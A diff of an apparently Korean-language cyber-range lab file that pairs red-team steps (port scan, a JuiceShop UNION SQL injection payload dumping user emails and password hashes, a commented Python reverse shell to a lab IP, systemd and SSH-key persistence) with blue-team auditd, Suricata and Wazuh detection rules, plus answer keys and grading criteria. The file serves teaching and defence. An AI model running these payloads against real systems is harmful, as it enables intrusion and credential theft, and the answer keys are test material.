@@ -3,8 +3,9 @@ title: 다단계 침투 — Initial Access → Execution → Persistence (AI 지
 version: ai
 course: battle-adv-ai
 week: 2
-description: MITRE ATT&CK의 Initial Access, Execution, Persistence 전술을 연계하여 다단계 침투 시나리오를 실습한다. Red Phase에서
-  공격 체인을 실행하고, Blue Phase에서 각 단계의 탐지 규칙을 작성하고 방어 매트릭스를 설계한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+description: MITRE ATT&CK의 Initial Access, Execution, Persistence 전술을 연계하여 다단계 침투
+  시나리오를 실습한다. Red Phase에서 공격 체인을 실행하고, Blue Phase에서 각 단계의 탐지 규칙을 작성하고 방어 매트릭스를 설계한다.
+  AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -22,22 +23,26 @@ infra_requirements:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: '[RED] 타겟 웹 서버 {{WEB_IP}}의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로 숨겨진 웹 경로도 열거하라.'
+  instruction: '[RED] 타겟 웹 서버 {{WEB_IP}}의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로 숨겨진
+    웹 경로도 열거하라.'
   hint: nmap -sV --top-ports 1000 후 dirb로 디렉토리를 열거한다.
   category: recon
   points: 10
-  answer: '🤖 프롬프트: [RED] 타겟 웹 서버 10.20.30.80의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로 숨겨진 웹 경로도 열거해줘
+  answer: '🤖 프롬프트: [RED] 타겟 웹 서버 10.20.30.80의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로
+    숨겨진 웹 경로도 열거해줘
 
-    📎 참고 (CLI): nmap -sV --top-ports 1000 --max-retries 1 --host-timeout 15s -T4 -oN /tmp/multi_stage_recon.txt
-    10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt 2>&1 | tail -15'
-  answer_detail: Initial Access 준비 단계에서 외부 노출 서비스를 파악하고 웹 경로를 열거한다(T1046, T1595.003). 서비스 버전은 CVE 매칭에,
-    디렉토리 열거는 숨겨진 관리 페이지 발견에 활용된다.
+    📎 참고 (CLI): nmap -sV --top-ports 1000 --max-retries 1 --host-timeout 15s -T4 -oN
+    /tmp/multi_stage_recon.txt 10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt
+    2>&1 | tail -15'
+  answer_detail: Initial Access 준비 단계에서 외부 노출 서비스를 파악하고 웹 경로를 열거한다(T1046, T1595.003).
+    서비스 버전은 CVE 매칭에, 디렉토리 열거는 숨겨진 관리 페이지 발견에 활용된다.
   verify:
     type: output_contains
     expect: open
     semantic:
-      intent: '[RED] 다단계 침투 Recon — nmap -sV -sC --top-ports 1000 + dirb / gobuster 로 상위 1000 포트 서비스 버전
-        + 숨겨진 웹 경로(/admin /api /backup /uploads) 탐색. w1 의 APT Recon 보다 더 깊은 활성 정찰. 초기 접근 벡터 다수 후보 확보'
+      intent: '[RED] 다단계 침투 Recon — nmap -sV -sC --top-ports 1000 + dirb / gobuster
+        로 상위 1000 포트 서비스 버전 + 숨겨진 웹 경로(/admin /api /backup /uploads) 탐색. w1 의 APT
+        Recon 보다 더 깊은 활성 정찰. 초기 접근 벡터 다수 후보 확보'
       success_criteria:
       - nmap --top-ports 1000 -sV -sC
       - dirb/gobuster 로 웹 경로 열거
@@ -54,9 +59,14 @@ steps:
       - 정찰 깊이 부족
   target_vm: attacker
   script: nmap -sV --top-ports 1000 --max-retries 1 --host-timeout 15s -T4 -oN /tmp/multi_stage_recon.txt
-    10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt 2>&1 | tail -15
+    10.20.30.80 && dirb http://10.20.30.80 /usr/share/dirb/wordlists/common.txt 2>&1
+    | tail -15
   risk_level: low
-  bastion_prompt: '[RED] 타겟 웹 서버 10.20.30.80의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로 숨겨진 웹 경로도 열거해줘'
+  bastion_prompt: '[RED] 타겟 웹 서버 10.20.30.80의 상위 1000개 포트를 스캔하고 서비스 버전을 확인하라. dirb로
+    숨겨진 웹 경로도 열거해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 2
   instruction: '[RED] UNION 기반 SQL Injection으로 JuiceShop에서 사용자 목록을 추출하라.'
   hint: products/search 엔드포인트에 UNION SELECT를 사용하여 Users 테이블 데이터를 추출한다.
@@ -66,14 +76,15 @@ steps:
 
     📎 참고 (CLI): curl -s "http://10.20.30.80:3000/rest/products/search?q=test''))UNION%20SELECT%20id,email,password,role,''5'',''6'',''7'',''8'',''9''%20FROM%20Users--"
     | python3 -m json.tool | head -30'
-  answer_detail: UNION 기반 SQL Injection(T1190)은 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의 데이터를 조회한다. 칼럼 수를 맞추는
-    것이 핵심이며, 사용자 이메일과 비밀번호 해시를 추출할 수 있다.
+  answer_detail: UNION 기반 SQL Injection(T1190)은 원래 쿼리에 UNION SELECT를 추가하여 다른 테이블의
+    데이터를 조회한다. 칼럼 수를 맞추는 것이 핵심이며, 사용자 이메일과 비밀번호 해시를 추출할 수 있다.
   verify:
     type: output_contains
     expect: email
     semantic:
       intent: '[RED] JuiceShop UNION SQLi 사용자 목록 추출 — /rest/products/search?q=test''))%20UNION%20SELECT%20id,email,password,role,null,null,null,null,null%20FROM%20Users--
-        로 Users 테이블의 id/email/password/role 전체 레코드 탈취. 기본 SQLi(OR 1=1) 와 달리 UNION 으로 특정 컬럼 타겟팅'
+        로 Users 테이블의 id/email/password/role 전체 레코드 탈취. 기본 SQLi(OR 1=1) 와 달리 UNION
+        으로 특정 컬럼 타겟팅'
       success_criteria:
       - UNION SELECT FROM Users 페이로드
       - email/password/role 등 특정 컬럼 추출
@@ -90,26 +101,33 @@ steps:
   script: curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION%20SELECT%20id,email,password,role,'5','6','7','8','9'%20FROM%20Users--"
     | python3 -m json.tool | head -30
   risk_level: medium
-  bastion_prompt: '[RED] UNION 기반 SQL Injection으로 JuiceShop에서 사용자 목록을 추출해줘'
+  bastion_prompt: '[RED] UNION 기반 SQL Injection으로 JuiceShop에서 사용자 목록을 추출해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 3
-  instruction: '[RED] Execution 기법을 시뮬레이션하라. Python 리버스 쉘 코드를 작성하되, 실제 연결 대신 코드 구조만 확인하는 시뮬레이션 파일을 생성하라.'
+  instruction: '[RED] Execution 기법을 시뮬레이션하라. Python 리버스 쉘 코드를 작성하되, 실제 연결 대신 코드 구조만
+    확인하는 시뮬레이션 파일을 생성하라.'
   hint: Python socket 모듈을 이용한 리버스 쉘 코드를 주석 처리하여 저장한다.
   category: exploit
   points: 10
   answer: '🤖 프롬프트: [RED] Execution 기법을 시뮬레이션하라 구현 방법과 예시를 설명해줘
 
-    📎 참고 (CLI): cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os # SIMULATION
-    ONLY - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # s.connect(("10.20.30.201",4444))
-    # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2) # subprocess.call(["/bin/sh","-i"])
-    print("Reverse shell simulation - code structure verified") PYEOF python3 /tmp/reverse_shell_sim.py'
-  answer_detail: 'Command and Scripting Interpreter: Python(T1059.006)은 APT가 자주 사용하는 Execution 기법이다. Python
-    리버스 쉘은 socket으로 연결하고 dup2로 stdin/stdout을 리다이렉트한다. 탐지: python 프로세스의 네트워크 연결 모니터링.'
+    📎 참고 (CLI): cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os
+    # SIMULATION ONLY - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    # s.connect(("10.20.30.201",4444)) # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+    os.dup2(s.fileno(),2) # subprocess.call(["/bin/sh","-i"]) print("Reverse shell
+    simulation - code structure verified") PYEOF python3 /tmp/reverse_shell_sim.py'
+  answer_detail: 'Command and Scripting Interpreter: Python(T1059.006)은 APT가 자주 사용하는
+    Execution 기법이다. Python 리버스 쉘은 socket으로 연결하고 dup2로 stdin/stdout을 리다이렉트한다. 탐지: python
+    프로세스의 네트워크 연결 모니터링.'
   verify:
     type: output_contains
     expect: simulation
     semantic:
-      intent: '[RED] Python 리버스 쉘 코드 구조 시뮬레이션 — cat > /tmp/reverse_shell.py << EOF import socket,subprocess,os;
-        s=socket.socket(); s.connect((LHOST,LPORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); subprocess.call([/bin/sh]).
+      intent: '[RED] Python 리버스 쉘 코드 구조 시뮬레이션 — cat > /tmp/reverse_shell.py << EOF
+        import socket,subprocess,os; s=socket.socket(); s.connect((LHOST,LPORT));
+        os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); subprocess.call([/bin/sh]).
         실제 연결 대신 코드 구조만 확인 (교육 목적). MITRE T1059.006 Python'
       success_criteria:
       - python reverse shell 코드 파일 생성
@@ -126,35 +144,42 @@ steps:
       - 코드 구조 설명 없음
       - MITRE 매핑 없음
   target_vm: attacker
-  script: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os # SIMULATION ONLY
-    - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # s.connect(("10.20.30.201",4444))
-    # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2) # subprocess.call(["/bin/sh","-i"])
-    print("Reverse shell simulation - code structure verified") PYEOF python3 /tmp/reverse_shell_sim.py'
+  script: 'cat > /tmp/reverse_shell_sim.py << ''PYEOF'' import socket,subprocess,os
+    # SIMULATION ONLY - DO NOT EXECUTE # s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    # s.connect(("10.20.30.201",4444)) # os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+    os.dup2(s.fileno(),2) # subprocess.call(["/bin/sh","-i"]) print("Reverse shell
+    simulation - code structure verified") PYEOF python3 /tmp/reverse_shell_sim.py'
   risk_level: medium
-  bastion_prompt: '[RED] Execution 기법을 시뮬레이션하라. Python 리버스 쉘 코드를 작성하되, 실제 연결 대신 코드 구조만 확인하는 시뮬레이션 파일을
-    생성하라.'
+  bastion_prompt: '[RED] Execution 기법을 시뮬레이션하라. Python 리버스 쉘 코드를 작성하되, 실제 연결 대신 코드
+    구조만 확인하는 시뮬레이션 파일을 생성하라.
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 4
-  instruction: '[RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라. (파일 생성만, 실제 설치 금지)'
+  instruction: '[RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라.
+    (파일 생성만, 실제 설치 금지)'
   hint: systemd service 유닛 파일을 /tmp에 작성하고, SSH 키를 생성하라.
   category: exploit
   points: 10
-  answer: '🤖 프롬프트: [RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라. (파일 생성만, 실제 설치
-    금지)해줘
+  answer: '🤖 프롬프트: [RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라.
+    (파일 생성만, 실제 설치 금지)해줘
 
-    📎 참고 (CLI): cat > /tmp/persistence_service_sim.service << ''EOF'' [Unit] Description=System Health
-    Monitor After=network.target [Service] Type=simple ExecStart=/bin/bash -c "echo PERSISTENCE_SERVICE_ACTIVE
-    > /tmp/svc_beacon.txt" Restart=always RestartSec=60 [Install] WantedBy=multi-user.target EOF cat /tmp/persistence_service_sim.service
-    && ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N "" -q && echo "Simulated attacker public key:" &&
-    cat /tmp/apt_key_sim.pub'
-  answer_detail: Systemd Service(T1543.002)와 SSH Authorized Keys(T1098.004)는 Linux에서 가장 효과적인 Persistence
-    기법이다. systemd는 부팅 시 자동 실행되고, SSH 키는 비밀번호 없이 접속을 허용한다.
+    📎 참고 (CLI): cat > /tmp/persistence_service_sim.service << ''EOF'' [Unit] Description=System
+    Health Monitor After=network.target [Service] Type=simple ExecStart=/bin/bash
+    -c "echo PERSISTENCE_SERVICE_ACTIVE > /tmp/svc_beacon.txt" Restart=always RestartSec=60
+    [Install] WantedBy=multi-user.target EOF cat /tmp/persistence_service_sim.service
+    && ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N "" -q && echo "Simulated attacker
+    public key:" && cat /tmp/apt_key_sim.pub'
+  answer_detail: Systemd Service(T1543.002)와 SSH Authorized Keys(T1098.004)는 Linux에서
+    가장 효과적인 Persistence 기법이다. systemd는 부팅 시 자동 실행되고, SSH 키는 비밀번호 없이 접속을 허용한다.
   verify:
     type: output_contains
     expect: multi-user.target
     semantic:
-      intent: '[RED] Persistence systemd + SSH 키 — systemd unit 파일(/tmp/sim.service [Unit]/[Service]/[Install])
-        구조 + ssh-keygen 공개키를 authorized_keys 추가. 2가지 지속성 기법 동시 시뮬레이션. systemctl enable 로 부팅 시 자동 실행. MITRE
-        T1543.002 Systemd Service + T1098.004 SSH Keys'
+      intent: '[RED] Persistence systemd + SSH 키 — systemd unit 파일(/tmp/sim.service
+        [Unit]/[Service]/[Install]) 구조 + ssh-keygen 공개키를 authorized_keys 추가. 2가지 지속성
+        기법 동시 시뮬레이션. systemctl enable 로 부팅 시 자동 실행. MITRE T1543.002 Systemd Service
+        + T1098.004 SSH Keys'
       success_criteria:
       - systemd unit 파일 생성 (ExecStart 등)
       - ssh-keygen + authorized_keys 삽입
@@ -169,35 +194,42 @@ steps:
       - systemctl enable 없음 (등록 안 됨)
       - MITRE 매핑 없음
   target_vm: attacker
-  script: cat > /tmp/persistence_service_sim.service << 'EOF' [Unit] Description=System Health Monitor
-    After=network.target [Service] Type=simple ExecStart=/bin/bash -c "echo PERSISTENCE_SERVICE_ACTIVE
-    > /tmp/svc_beacon.txt" Restart=always RestartSec=60 [Install] WantedBy=multi-user.target EOF cat /tmp/persistence_service_sim.service
-    && ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N "" -q && echo "Simulated attacker public key:" &&
-    cat /tmp/apt_key_sim.pub
+  script: cat > /tmp/persistence_service_sim.service << 'EOF' [Unit] Description=System
+    Health Monitor After=network.target [Service] Type=simple ExecStart=/bin/bash
+    -c "echo PERSISTENCE_SERVICE_ACTIVE > /tmp/svc_beacon.txt" Restart=always RestartSec=60
+    [Install] WantedBy=multi-user.target EOF cat /tmp/persistence_service_sim.service
+    && ssh-keygen -t ed25519 -f /tmp/apt_key_sim -N "" -q && echo "Simulated attacker
+    public key:" && cat /tmp/apt_key_sim.pub
   risk_level: medium
-  bastion_prompt: '[RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라. (파일 생성만, 실제 설치
-    금지)해줘'
+  bastion_prompt: '[RED] Persistence 기법 — systemd 서비스 유닛 파일과 SSH 키를 이용한 지속성 확보를 시뮬레이션하라.
+    (파일 생성만, 실제 설치 금지)해줘
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
 - order: 5
-  instruction: '[BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 작성하라. /etc/passwd, SSH 키, crontab,
-    systemd 서비스 수정을 모니터링하라.'
+  instruction: '[BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 작성하라. /etc/passwd,
+    SSH 키, crontab, systemd 서비스 수정을 모니터링하라.'
   hint: auditctl -w 명령 형태의 규칙을 작성한다.
   category: defense
   points: 10
-  answer: '🤖 프롬프트: [BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: '🤖 프롬프트: [BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 구현 방법을
+    설명하고 예시 코드를 보여줘
 
-    📎 참고 (CLI): cat > /tmp/audit_persistence_rules.conf << ''EOF'' -w /etc/passwd -p wa -k persistence_account
-    -w /etc/shadow -p wa -k persistence_account -w /etc/crontab -p wa -k persistence_cron -w /var/spool/cron/
-    -p wa -k persistence_cron -w /etc/systemd/system/ -p wa -k persistence_service -w /root/.ssh/authorized_keys
-    -p wa -k persistence_ssh EOF cat /tmp/audit_persistence_rules.conf'
-  answer_detail: auditd는 리눅스 커널 수준의 감사 시스템이다. -w(watch)로 파일을 감시하고, -p wa(write/attribute change)로 수정 이벤트를
-    기록하며, -k(key)로 이벤트를 분류한다.
+    📎 참고 (CLI): cat > /tmp/audit_persistence_rules.conf << ''EOF'' -w /etc/passwd
+    -p wa -k persistence_account -w /etc/shadow -p wa -k persistence_account -w /etc/crontab
+    -p wa -k persistence_cron -w /var/spool/cron/ -p wa -k persistence_cron -w /etc/systemd/system/
+    -p wa -k persistence_service -w /root/.ssh/authorized_keys -p wa -k persistence_ssh
+    EOF cat /tmp/audit_persistence_rules.conf'
+  answer_detail: auditd는 리눅스 커널 수준의 감사 시스템이다. -w(watch)로 파일을 감시하고, -p wa(write/attribute
+    change)로 수정 이벤트를 기록하며, -k(key)로 이벤트를 분류한다.
   verify:
     type: output_contains
     expect: persistence
     semantic:
-      intent: '[BLUE] auditd 규칙 — -w /etc/passwd -p wa -k passwd_watch + -w /etc/shadow -p wa -k shadow_watch
-        + -w /root/.ssh -p rwa -k ssh_access + -w /etc/cron.d -p wa -k cron_watch. /etc/audit/rules.d/50-suspect.rules
-        배포 후 auditctl -R. 4종 크리티컬 경로 변경 이벤트 실시간 로깅'
+      intent: '[BLUE] auditd 규칙 — -w /etc/passwd -p wa -k passwd_watch + -w /etc/shadow
+        -p wa -k shadow_watch + -w /root/.ssh -p rwa -k ssh_access + -w /etc/cron.d
+        -p wa -k cron_watch. /etc/audit/rules.d/50-suspect.rules 배포 후 auditctl -R.
+        4종 크리티컬 경로 변경 이벤트 실시간 로깅'
       success_criteria:
       - auditctl -w 또는 rules.d 파일 생성
       - /etc/passwd·shadow·.ssh·cron.d 4대 경로 감시
@@ -212,35 +244,38 @@ steps:
       - 감시 경로 3개 이하
       - key 없어 조회 어려움
   target_vm: secu
-  script: cat > /tmp/audit_persistence_rules.conf << 'EOF' -w /etc/passwd -p wa -k persistence_account
-    -w /etc/shadow -p wa -k persistence_account -w /etc/crontab -p wa -k persistence_cron -w /var/spool/cron/
-    -p wa -k persistence_cron -w /etc/systemd/system/ -p wa -k persistence_service -w /root/.ssh/authorized_keys
-    -p wa -k persistence_ssh EOF cat /tmp/audit_persistence_rules.conf
+  script: cat > /tmp/audit_persistence_rules.conf << 'EOF' -w /etc/passwd -p wa -k
+    persistence_account -w /etc/shadow -p wa -k persistence_account -w /etc/crontab
+    -p wa -k persistence_cron -w /var/spool/cron/ -p wa -k persistence_cron -w /etc/systemd/system/
+    -p wa -k persistence_service -w /root/.ssh/authorized_keys -p wa -k persistence_ssh
+    EOF cat /tmp/audit_persistence_rules.conf
   risk_level: low
-  bastion_prompt: '[BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 작성하라. /etc/passwd, SSH 키, crontab,
-    systemd 서비스 수정을 모니터링하라.'
+  bastion_prompt: '[BLUE] Phase 전환 — 다단계 침투 과정에서 생성될 아티팩트를 탐지하는 auditd 규칙을 작성하라. /etc/passwd,
+    SSH 키, crontab, systemd 서비스 수정을 모니터링하라.'
 - order: 6
   instruction: '[BLUE] Suricata 커스텀 규칙을 작성하여 SQL Injection과 리버스 쉘 연결을 탐지하라.'
   hint: alert http/tcp 규칙으로 SQL 키워드와 비정상 포트 연결을 탐지한다.
   category: defense
   points: 10
-  answer: '🤖 프롬프트: [BLUE] Suricata 커스텀 규칙을 작성하여 SQL Injection과 리버스 쉘 연결을 탐지하라 구현 방법과 예시를 설명해줘
+  answer: '🤖 프롬프트: [BLUE] Suricata 커스텀 규칙을 작성하여 SQL Injection과 리버스 쉘 연결을 탐지하라 구현 방법과
+    예시를 설명해줘
 
-    📎 참고 (CLI): cat > /tmp/custom_detection.rules << ''EOF'' alert http any any -> 10.20.30.0/24 any (msg:"SQLI
-    Attempt - UNION SELECT"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase;
-    distance:0; within:20; sid:1000001; rev:1;) alert tcp 10.20.30.0/24 any -> any 4444 (msg:"Possible
-    Reverse Shell - Port 4444"; flow:established; sid:1000002; rev:1;) alert tcp 10.20.30.0/24 any ->
-    any any (msg:"Suspicious Python Reverse Shell"; content:"|2f 62 69 6e 2f 73 68|"; sid:1000003; rev:1;)
-    EOF cat /tmp/custom_detection.rules'
-  answer_detail: Suricata 커스텀 규칙으로 SQL Injection(UNION SELECT 패턴), 리버스 쉘(포트 4444), /bin/sh 바이너리 시그니처를
-    탐지한다.
+    📎 참고 (CLI): cat > /tmp/custom_detection.rules << ''EOF'' alert http any any ->
+    10.20.30.0/24 any (msg:"SQLI Attempt - UNION SELECT"; flow:to_server,established;
+    content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; sid:1000001;
+    rev:1;) alert tcp 10.20.30.0/24 any -> any 4444 (msg:"Possible Reverse Shell -
+    Port 4444"; flow:established; sid:1000002; rev:1;) alert tcp 10.20.30.0/24 any
+    -> any any (msg:"Suspicious Python Reverse Shell"; content:"|2f 62 69 6e 2f 73
+    68|"; sid:1000003; rev:1;) EOF cat /tmp/custom_detection.rules'
+  answer_detail: Suricata 커스텀 규칙으로 SQL Injection(UNION SELECT 패턴), 리버스 쉘(포트 4444),
+    /bin/sh 바이너리 시그니처를 탐지한다.
   verify:
     type: output_contains
     expect: UNION SELECT
     semantic:
-      intent: '[BLUE] Suricata SQLi + 리버스 쉘 룰 — alert http (content:UNION nocase; content:SELECT) + alert
-        tcp (outbound 비표준 포트 연결 + reverse shell 시그니처 /bin/sh|sh -i|bash -i). 웹 공격 + 반출 채널 양방향 커버. threshold
-        로 오탐 최소화'
+      intent: '[BLUE] Suricata SQLi + 리버스 쉘 룰 — alert http (content:UNION nocase;
+        content:SELECT) + alert tcp (outbound 비표준 포트 연결 + reverse shell 시그니처 /bin/sh|sh
+        -i|bash -i). 웹 공격 + 반출 채널 양방향 커버. threshold 로 오탐 최소화'
       success_criteria:
       - HTTP SQLi 룰 + TCP 리버스 쉘 룰
       - /etc/suricata/rules/local.rules 저장
@@ -255,36 +290,41 @@ steps:
       - sid 없음
       - flow 방향 제한 없음
   target_vm: secu
-  script: cat > /tmp/custom_detection.rules << 'EOF' alert http any any -> 10.20.30.0/24 any (msg:"SQLI
-    Attempt - UNION SELECT"; flow:to_server,established; content:"UNION"; nocase; content:"SELECT"; nocase;
-    distance:0; within:20; sid:1000001; rev:1;) alert tcp 10.20.30.0/24 any -> any 4444 (msg:"Possible
-    Reverse Shell - Port 4444"; flow:established; sid:1000002; rev:1;) alert tcp 10.20.30.0/24 any ->
-    any any (msg:"Suspicious Python Reverse Shell"; content:"|2f 62 69 6e 2f 73 68|"; sid:1000003; rev:1;)
-    EOF cat /tmp/custom_detection.rules
+  script: cat > /tmp/custom_detection.rules << 'EOF' alert http any any -> 10.20.30.0/24
+    any (msg:"SQLI Attempt - UNION SELECT"; flow:to_server,established; content:"UNION";
+    nocase; content:"SELECT"; nocase; distance:0; within:20; sid:1000001; rev:1;)
+    alert tcp 10.20.30.0/24 any -> any 4444 (msg:"Possible Reverse Shell - Port 4444";
+    flow:established; sid:1000002; rev:1;) alert tcp 10.20.30.0/24 any -> any any
+    (msg:"Suspicious Python Reverse Shell"; content:"|2f 62 69 6e 2f 73 68|"; sid:1000003;
+    rev:1;) EOF cat /tmp/custom_detection.rules
   risk_level: low
   bastion_prompt: '[BLUE] Suricata 커스텀 규칙을 작성하여 SQL Injection과 리버스 쉘 연결을 탐지하라.'
 - order: 7
-  instruction: '[BLUE] Wazuh SIEM에서 다단계 침투를 탐지하기 위한 상관 분석 규칙을 작성하라. 5분 내 3개 이상의 Persistence 기법이 감지되면 알림을
-    발생시켜라.'
+  instruction: '[BLUE] Wazuh SIEM에서 다단계 침투를 탐지하기 위한 상관 분석 규칙을 작성하라. 5분 내 3개 이상의 Persistence
+    기법이 감지되면 알림을 발생시켜라.'
   hint: Wazuh의 composite rule 문법으로 frequency와 timeframe을 설정한다.
   category: defense
   points: 10
-  answer: "\U0001F916 프롬프트: [BLUE] Wazuh SIEM에서 다단계 침투를 탐지하기 위한 상관 분석 규칙을 구현 방법을 설명하고 예시 코드를 보여줘\n\U0001F4CE\
-    \ 참고 (CLI): cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\">\n  <rule\
-    \ id=\"100110\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>persistence_detection</if_matched_group>\n\
-    \    <description>Multi-stage attack: 3+ persistence techniques in 5 min</description>\n    <mitre>\n\
-    \      <id>T1053</id>\n      <id>T1136</id>\n      <id>T1543</id>\n    </mitre>\n  </rule>\n  <rule\
-    \ id=\"100111\" level=\"10\">\n    <if_sid>550</if_sid>\n    <match>useradd|adduser|crontab</match>\n\
-    \    <group>persistence_detection</group>\n    <description>Persistence: Account or crontab modification</description>\n\
+  answer: "\U0001F916 프롬프트: [BLUE] Wazuh SIEM에서 다단계 침투를 탐지하기 위한 상관 분석 규칙을 구현 방법을 설명하고\
+    \ 예시 코드를 보여줘\n\U0001F4CE 참고 (CLI): cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n\
+    <group name=\"multistage_attack\">\n  <rule id=\"100110\" level=\"12\" frequency=\"\
+    3\" timeframe=\"300\">\n    <if_matched_group>persistence_detection</if_matched_group>\n\
+    \    <description>Multi-stage attack: 3+ persistence techniques in 5 min</description>\n\
+    \    <mitre>\n      <id>T1053</id>\n      <id>T1136</id>\n      <id>T1543</id>\n\
+    \    </mitre>\n  </rule>\n  <rule id=\"100111\" level=\"10\">\n    <if_sid>550</if_sid>\n\
+    \    <match>useradd|adduser|crontab</match>\n    <group>persistence_detection</group>\n\
+    \    <description>Persistence: Account or crontab modification</description>\n\
     \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_multistage_rule.xml"
-  answer_detail: Wazuh 상관 분석 규칙은 개별 이벤트를 연결하여 다단계 공격을 탐지한다. frequency와 timeframe으로 시간 윈도우 내 이벤트 빈도를 추적한다.
+  answer_detail: Wazuh 상관 분석 규칙은 개별 이벤트를 연결하여 다단계 공격을 탐지한다. frequency와 timeframe으로
+    시간 윈도우 내 이벤트 빈도를 추적한다.
   verify:
     type: output_contains
     expect: multistage_attack
     semantic:
-      intent: '[BLUE] Wazuh 다단계 침투 correlation — frequency=3 + timeframe=300 + if_matched_sid 로 5분 내 3개
-        이상 Persistence 관련 이벤트(systemd service 생성·SSH key 추가·cron 등록·useradd) 조합 시 고위험 경보. /var/ossec/etc/rules/local_rules.xml
-        에 추가. 다단계 지속성 시도의 burst 패턴 탐지'
+      intent: '[BLUE] Wazuh 다단계 침투 correlation — frequency=3 + timeframe=300 + if_matched_sid
+        로 5분 내 3개 이상 Persistence 관련 이벤트(systemd service 생성·SSH key 추가·cron 등록·useradd)
+        조합 시 고위험 경보. /var/ossec/etc/rules/local_rules.xml 에 추가. 다단계 지속성 시도의 burst
+        패턴 탐지'
       success_criteria:
       - local_rules.xml frequency+timeframe 룰
       - Persistence 관련 3개 이상 이벤트 조합
@@ -299,42 +339,47 @@ steps:
       - correlation 아닌 threshold
       - Persistence 특화 아님
   target_vm: siem
-  script: "cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\">\n  <rule\
-    \ id=\"100110\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n    <if_matched_group>persistence_detection</if_matched_group>\n\
-    \    <description>Multi-stage attack: 3+ persistence techniques in 5 min</description>\n    <mitre>\n\
-    \      <id>T1053</id>\n      <id>T1136</id>\n      <id>T1543</id>\n    </mitre>\n  </rule>\n  <rule\
-    \ id=\"100111\" level=\"10\">\n    <if_sid>550</if_sid>\n    <match>useradd|adduser|crontab</match>\n\
-    \    <group>persistence_detection</group>\n    <description>Persistence: Account or crontab modification</description>\n\
+  script: "cat > /tmp/wazuh_multistage_rule.xml << 'EOF'\n<group name=\"multistage_attack\"\
+    >\n  <rule id=\"100110\" level=\"12\" frequency=\"3\" timeframe=\"300\">\n   \
+    \ <if_matched_group>persistence_detection</if_matched_group>\n    <description>Multi-stage\
+    \ attack: 3+ persistence techniques in 5 min</description>\n    <mitre>\n    \
+    \  <id>T1053</id>\n      <id>T1136</id>\n      <id>T1543</id>\n    </mitre>\n\
+    \  </rule>\n  <rule id=\"100111\" level=\"10\">\n    <if_sid>550</if_sid>\n  \
+    \  <match>useradd|adduser|crontab</match>\n    <group>persistence_detection</group>\n\
+    \    <description>Persistence: Account or crontab modification</description>\n\
     \  </rule>\n</group>\nEOF\ncat /tmp/wazuh_multistage_rule.xml"
   risk_level: low
